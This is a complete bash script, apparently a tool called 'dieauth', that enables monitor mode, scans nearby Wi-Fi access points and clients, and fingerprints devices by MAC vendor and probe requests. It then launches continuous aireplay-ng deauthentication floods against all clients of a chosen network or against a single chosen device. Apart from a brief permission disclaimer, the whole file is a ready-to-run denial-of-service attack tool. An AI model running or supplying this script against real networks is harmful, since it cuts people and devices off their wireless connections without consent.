#!/bin/bash
RED='\033[0;31m' GREEN='\033[0;32m' YELLOW='\033[1;33m' WHITE='\033[1;37m' CYAN='\033[0;36m' NC='\033[0m'

cleanup() {
    [ -n "$mon_iface" ] && airmon-ng stop "$mon_iface" >/dev/null 2>&1
    [ -n "$iface" ] && {
        ip link set "$iface" up 2>/dev/null
        rfkill unblock wifi 2>/dev/null
        systemctl restart NetworkManager 2>/dev/null || true
    }
    echo -e "${YELLOW}[*] Interface restored.${NC}"
}

die() { echo -e "${RED}[!] $1${NC}"; exit 1; }

get_oui_vendor() {
    local mac="$1" oui v
    oui=$(tr -d ':' <<< "$mac" | cut -c1-6 | tr 'a-f' 'A-F')
    [ ${#oui} -ne 6 ] && { echo ""; return; }
    for f in /usr/share/nmap/nmap-mac-prefixes /usr/local/share/nmap/nmap-mac-prefixes; do
        [ -f "$f" ] && v=$(grep -m1 "^$oui" "$f" 2>/dev/null | cut -d' ' -f2-) && [ -n "$v" ] && echo "$v" && return
    done
    v=$(curl -s -m 2 "https://api.macvendors.com/$oui" 2>/dev/null)
    echo "${v:-}"
}

get_device_type_from_vendor() {
    local v=$(tr '[:upper:]' '[:lower:]' <<< "$1" | xargs)
    [ -z "$v" ] && echo "" && return
    case "$v" in
        *apple*)        echo 'Possible: iPhone / iPad / Mac' ;;
        *samsung*)      echo 'Possible: Android phone / Tablet / TV' ;;
        *google*)       echo 'Possible: Pixel phone / Chromecast / Nest' ;;
        *microsoft*)    echo 'Possible: Windows PC / Surface / Xbox' ;;
        *xiaomi*|*redmi*|*poco*) echo 'Possible: Xiaomi / Redmi / Poco Android' ;;
        *huawei*|*honor*) echo 'Possible: Huawei / Honor Android' ;;
        *oneplus*|*oppo*|*realme*|*vivo*) echo 'Possible: Android phone' ;;
        *lenovo*|*motorola*) echo 'Possible: Lenovo / Motorola Android / PC' ;;
        *asus*)         echo 'Possible: ASUS router / Laptop / Phone' ;;
        *dell*)         echo 'Possible: Dell PC / Laptop' ;;
        *hp*|*hewlett*) echo 'Possible: HP PC / Laptop / Printer' ;;
        *sony*)         echo 'Possible: Sony TV / PlayStation' ;;
        *lg*)           echo 'Possible: LG TV / Phone' ;;
        *hisense*|*tcl*|*philips*|*panasonic*|*sharp*|*vizio*) echo 'Possible: Smart TV' ;;
        *roku*)         echo 'Possible: Roku streaming device' ;;
        *amazon*|*kindle*) echo 'Possible: Fire TV / Echo / Kindle' ;;
        *nintendo*)     echo 'Possible: Nintendo console' ;;
        *tp-link*)      echo 'Possible: TP-Link router / IoT' ;;
        *d-link*)       echo 'Possible: D-Link router' ;;
        *netgear*)      echo 'Possible: Netgear router' ;;
        *ubiquiti*)     echo 'Possible: Ubiquiti AP / router' ;;
        *espressif*)    echo 'Possible: ESP32 / ESP8266 IoT' ;;
        *raspberry*)    echo 'Possible: Raspberry Pi' ;;
        *canon*|*brother*|*epson*) echo 'Possible: Printer' ;;
        *intel*|*broadcom*|*qualcomm*|*atheros*|*mediatek*) echo 'Possible: Laptop / Phone WiFi chipset' ;;
        *) echo 'Unknown'
    esac
}

get_device_hint_from_probes() {
    local p=$(tr 'A-Z' 'a-z' <<< "$1")
    [ -z "$p" ] && echo "" && return
    case "$p" in
        *iphone*|*ipad*) echo "iPhone/iPad?" ;;
        *android*|*galaxy*|*redmi*|*mi*|*poco*) echo "Android phone?" ;;
        *direct-*|*smart-tv*|*bravia*|*cast*|*dlna*|*airplay*) echo "Smart TV/casting?" ;;
        *samsung*tv*) echo "Samsung TV?" ;;
        *lg\ smart*|*webos*) echo "LG Smart TV?" ;;
        *hisense*|*tcl*|*philips*|*panasonic*) echo "Smart TV?" ;;
        *roku*) echo "Roku?" ;;
        *fire*tv*|*aft*) echo "Fire TV/Stick?" ;;
        *chromecast*) echo "Chromecast?" ;;
        *ps4*|*ps5*|*playstation*|*xbox*) echo "Game console?" ;;
        *switch*|*nintendo*) echo "Nintendo console?" ;;
        *apple*|*macbook*) echo "Apple device?" ;;
        *huawei*|*honor*) echo "Huawei phone?" ;;
        *) echo ""
    esac
}

trap 'kill $attack_pid $scan_pid 2>/dev/null; exit 130' INT
trap 'kill $attack_pid $scan_pid 2>/dev/null; exit 143' TERM
trap 'cleanup; exit $?' EXIT

clear
echo -e "\n\n\n${RED}▓█████▄ ██▓▓█████ ▄▄▄ █ ██ ▄▄▄█████▓ ██░ ██ ${NC}"
echo -e "${RED}▒██▀ ██▌▓██ ▓█ ▀▒████▄ ██ ▓██▒▓ ██▒ ▓▒▓██░ ██▒${NC}"
echo -e "${RED}░██ █▌▒██ ▒███ ▒██ ▀█▄ ▓██ ▒██░▒ ▓██░ ▒░▒██▀▀██░${NC}"
echo -e "${RED}░▓█▄ ▌░██ ▒▓█ ▄░██▄▄▄▄██ ▓▓█ ░██░░ ▓██▓ ░ ░▓█ ░██ ${NC}"
echo -e "${RED}░▒████▓ ░██ ░▒████▒▓█ ▓██▒▒▒█████▓ ▒██▒ ░ ░▓█▒░██▓${NC}"
echo -e "${RED} ▒▒▓ ▒ ░▓ ░░ ▒░ ░▒▒ ▓▒█░░▒▓▒ ▒ ▒ ▒ ░░ ▒ ░░▒░▒${NC}"
echo -e "${RED} ░ ▒ ▒ ▒ ░ ░ ░ ░  ░ ▒ ▒▒ ░░░▒░ ░ ░ ░ ▒ ░▒░ ░${NC}"
echo -e "${RED} ░ ░ ░ ▒ ░ ░ ░ ░  ░ ▒ ░░░ ░ ░ ░ ░ ░ ░░ ░${NC}"
echo -e "${RED} ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░  ░ ░   ░ ░  ░  ░${NC}\n"

echo -e "${RED}╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║ WARNING: YOU ARE SOLELY RESPONSIBLE FOR YOUR USE OF THIS TOOL. ║${NC}"
echo -e "${RED}║ Use only on networks you own or have explicit permission.     ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════════╝${NC}\n"

[[ $EUID -ne 0 ]] && die "Run as root: sudo $0"

echo -e "${GREEN}[1] Select wireless interface${NC}"
mapfile -t wifi_ifaces < <(iw dev 2>/dev/null | awk '/^\tInterface/{print $2}')
[ ${#wifi_ifaces[@]} -eq 0 ] && die "No wireless interfaces found."
for i in "${!wifi_ifaces[@]}"; do echo " $((i+1))) ${wifi_ifaces[i]}"; done
echo ""
read -p "Enter number or name: " choice
choice=$(echo "$choice" | xargs)
if [[ "$choice" =~ ^[0-9]+$ ]] && ((choice >= 1 && choice <= ${#wifi_ifaces[@]})); then
    iface=${wifi_ifaces[choice-1]}
elif [[ -n "$choice" ]]; then
    for w in "${wifi_ifaces[@]}"; do [[ "$w" == "$choice" ]] && iface="$w" && break; done
fi
[ -z "$iface" ] && die "Invalid interface."

echo -e "${GREEN}[+] Using interface: $iface${NC}\n"

echo -e "${GREEN}[2] Enabling monitor mode...${NC}"
airmon-ng check kill >/dev/null 2>&1
airmon_out=$(airmon-ng start "$iface" 2>&1)
[ $? -ne 0 ] && die "$airmon_out"

mon_iface=$(echo "$airmon_out" | grep -oE '(wlan|mon)[0-9]+' | head -1)
[ -z "$mon_iface" ] && mon_iface=$(awk '/type monitor/{print prev} {prev=$2}' < <(iw dev) | tail -1)
[ -z "$mon_iface" ] && mon_iface="${iface}mon"
ip link show "$mon_iface" &>/dev/null || die "Monitor interface not found."

echo -e "${GREEN}[+] Monitor interface: $mon_iface${NC}\n"

echo -e "${GREEN}[3] Attack type${NC}"
echo " 1) Cluster Bomb"
echo " 2) Guided Missile"
read -p "Enter 1 or 2: " attack_type
[[ "$attack_type" != "1" && "$attack_type" != "2" ]] && die "Invalid choice."

echo -e "\n${GREEN}[4] Live scan (press Enter when ready)${NC}"
rm -f /tmp/dieauth_scan-*.csv
airodump-ng "$mon_iface" -w /tmp/dieauth_scan --output-format csv --write-interval 3 >/dev/null 2>&1 &
scan_pid=$!

while true; do
    sleep 3
    csv=$(ls -t /tmp/dieauth_scan-*.csv 2>/dev/null | head -1)
    [ -n "$csv" ] && {
        apc=$(awk -F',' '/^[0-9A-Fa-f]{2}:/{c++} END{print c+0}' "$csv")
        stc=$(awk -F',' '/^Station MAC/{getline; c=0} /^[0-9A-Fa-f]{2}:/ && $6~/^[0-9A-Fa-f]{2}:/{c++} END{print c}' "$csv")
        echo -ne "\r${CYAN}APs: $apc  Clients: $stc   Press Enter to continue${NC} "
    }
    read -t 3 && break
done

kill $scan_pid 2>/dev/null; wait $scan_pid 2>/dev/null
csv=$(ls -t /tmp/dieauth_scan-*.csv 2>/dev/null | head -1)
[ ! -s "$csv" ] && die "No scan data."

declare -A ap_essid ap_ch
while IFS=, read -r bssid _ _ ch _ _ _ _ _ _ _ _ _ essid _; do
    [[ "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] || continue
    ap_essid[$bssid]="${essid//\"/}"
    ap_ch[$bssid]="${ch// /}"
done < <(awk -F',' '/^BSSID/{getline; while($1~/^[0-9A-Fa-f]{2}:/){print; getline}}' "$csv")

[ ${#ap_essid[@]} -eq 0 ] && die "No APs found."

declare -a station_list
while IFS=, read -r stamac _ _ _ _ bssid probed; do
    [[ "$stamac" =~ ^[0-9A-Fa-f]{2}: && "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && station_list+=("$stamac|$bssid|$probed")
done < <(awk -F',' '/^Station MAC/{getline; while($1~/^[0-9A-Fa-f]{2}:/){print; getline}}' "$csv")

if [ "$attack_type" = "1" ]; then
    echo -e "${CYAN}Cluster Bomb - Select AP${NC}"
    idx=1; for b in "${!ap_essid[@]}"; do printf "%2d %-18s %3s %s\n" "$idx" "$b" "${ap_ch[$b]}" "${ap_essid[$b]}"; ((idx++)); done
    read -p "AP number: " n
    target_bssid=$(printf '%s\n' "${!ap_essid[@]}" | sed -n "${n}p")
    [ -z "$target_bssid" ] && die "Invalid AP."
    target_ch=${ap_ch[$target_bssid]}

    [ -n "$target_ch" ] && [ "$target_ch" != "0" ] && iw dev "$mon_iface" set channel "$target_ch" 2>/dev/null || iwconfig "$mon_iface" channel "$target_ch" >/dev/null 2>&1

    read -p "Exclude your MAC (blank = include all): " my_mac
    my_mac=$(echo "$my_mac" | xargs)

    clients=()
    for s in "${station_list[@]}"; do
        IFS='|' read -r mac bssid _ <<< "$s"
        [[ "$bssid" == "$target_bssid" && ( -z "$my_mac" || "$mac" != "$my_mac" ) ]] && clients+=("$mac")
    done

    echo -e "\n${RED}Aggressive Cluster Bomb started (${#clients[@]} clients + broadcast). Ctrl+C to stop.${NC}"

    killall aireplay-ng 2>/dev/null
    for c in "${clients[@]}"; do
        aireplay-ng --deauth 0 -a "$target_bssid" -c "$c" --ignore-negative-one -x 1000 "$mon_iface" &
    done
    aireplay-ng --deauth 0 -a "$target_bssid" --ignore-negative-one -x 1000 "$mon_iface" &
    wait
fi

if [ "$attack_type" = "2" ]; then
    echo -e "${CYAN}Guided Missile - Select client${NC}"
    idx=1
    for s in "${station_list[@]}"; do
        IFS='|' read -r mac bssid probed <<< "$s"
        essid=${ap_essid[$bssid]:-?}
        ch=${ap_ch[$bssid]}
        vendor=$(get_oui_vendor "$mac")
        type=$(get_device_type_from_vendor "$vendor")
        hint=$(get_device_hint_from_probes "$probed")
        dev="${type:-${hint:-Unknown}}"
        printf "%2d %-18s %-18s %3s %-12s %s\n" "$idx" "$mac" "$bssid" "$ch" "$essid" "$dev"
        ((idx++))
    done

    read -p "Client number: " n
    IFS='|' read -r target_client target_bssid <<< "${station_list[$((n-1))]}"
    [ -z "$target_client" ] && die "Invalid client."

    target_ch=${ap_ch[$target_bssid]}
    [ -n "$target_ch" ] && [ "$target_ch" != "0" ] && iw dev "$mon_iface" set channel "$target_ch" 2>/dev/null || iwconfig "$mon_iface" channel "$target_ch" >/dev/null 2>&1

    echo -e "\n${RED}Aggressive Guided Missile on $target_client. Ctrl+C to stop.${NC}"
    killall aireplay-ng 2>/dev/null
    aireplay-ng --deauth 0 -a "$target_bssid" -c "$target_client" --ignore-negative-one -x 1000 "$mon_iface" &
    wait
fi

exit 0
